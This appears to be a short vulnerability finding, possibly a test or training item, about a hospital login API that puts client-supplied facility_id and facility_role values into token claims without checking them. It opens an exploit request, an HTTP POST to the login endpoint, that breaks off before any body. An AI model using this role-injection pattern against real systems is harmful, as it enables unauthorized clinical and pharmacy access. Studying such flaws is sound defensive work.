diagnosis: The payload handler allows authenticating users to specify facility_id and facility_role in the login request body, directly stamping these attributes into the cryptographic token claims. It fails to check if the user is licensed or assigned to that facility with the specified role. A nurse or orderly can request facility_role 'chief_surgeon' or 'pharmacy_admin' for any hospital facility.
exploit_request:
POST /api/v1/hospital/auth/login/ HTTP/1.1
Host: api.medhealth-systems.org
Content-Type: application/json
